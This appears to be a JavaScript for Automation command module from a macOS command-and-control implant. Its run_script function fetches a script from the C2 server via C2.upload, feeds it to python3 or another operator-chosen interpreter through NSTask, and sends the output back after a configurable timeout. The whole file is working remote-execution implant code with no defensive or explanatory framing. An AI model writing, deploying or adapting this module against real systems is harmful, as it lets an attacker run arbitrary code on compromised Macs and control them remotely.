exports.run_script = function(task, command, params){
    //Parse JSON to retrieve input
    try {
        let config = JSON.parse(params);
        let program_path = "/usr/bin/python3";
        let script = "";
        let args = [];
        let timeoutSeconds = 1800;
        if(config.hasOwnProperty("file")){
            let script_data = C2.upload(task, config['file']);
            if(typeof script_data === "string"){
                return{"user_output":"Failed to get contents of file\n" + script_data, "completed": true, "status": "error"};
            }
            script = $.NSString.alloc.initWithDataEncoding(script_data, $.NSUTF8StringEncoding);
        } else {
            return {"user_output": "missing file parameter", "completed": true, "status": "error"}
        }
        if(config.hasOwnProperty("interpreter")){
            program_path = config["interpreter"];
        }
        if(config.hasOwnProperty("args")){
            args = config["args"];
        }
        if(config.hasOwnProperty("timeout")){
            timeoutSeconds = config["timeout"];
        }
        let inputData = script.dataUsingEncoding($.NSUTF8StringEncoding);
        // Prepare NSTask
        let script_task = $.NSTask.alloc.init;
        script_task.setLaunchPath(program_path);
        script_task.setArguments(args);

        // Set up input and output pipes
        const inputPipe = $.NSPipe.pipe;
        const outputPipe = $.NSPipe.pipe;
        const errorPipe = $.NSPipe.pipe;

        script_task.setStandardInput(inputPipe);
        script_task.setStandardOutput(outputPipe);
        script_task.setStandardError(errorPipe);

        // Write input to the process
        const inputHandle = inputPipe.fileHandleForWriting;
        inputHandle.writeData(inputData);
        inputHandle.closeFile;

        // Launch task
        script_task.launch;

        // Start Timeout
        const start = $.NSDate.date;
        while (script_task.isRunning) {
             $.NSThread.sleepForTimeInterval(0.5);   // sleep 0.5s steps
             const elapsed = $.NSDate.date.timeIntervalSinceDate(start);
             if (elapsed > timeoutSeconds) {
                  // Timeout reached → kill the task
                  try { script_task.terminate; } catch (e) {
                                            let errorMessage = "Script exceeded timeout threshold without a response. An error occurred during termination: " + e.toString();
                                            return {"user_output":errorMessage, "completed": true, "status": "error"};
                                            }
                  return {"user_output":"Script exceeded timeout threshold without a response and was terminated.", "completed": true, "status": "error"};
             }
        }

        // Read output
        const outputHandle = outputPipe.fileHandleForReading;
        const errorHandle = errorPipe.fileHandleForReading;
        const outputData = outputHandle.readDataToEndOfFile;
        const errorData = errorHandle.readDataToEndOfFile;
        const outputString = $.NSString.alloc.initWithDataEncoding(outputData, $.NSUTF8StringEncoding);
        const errorString = $.NSString.alloc.initWithDataEncoding(errorData, $.NSUTF8StringEncoding);
        // Aggregate Response
        let response1py = ObjC.unwrap(outputString);
        let response2py = ObjC.unwrap(errorString);
        let responsepy = response1py + response2py;
        return {"user_output":responsepy, "completed": true};
     }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
}
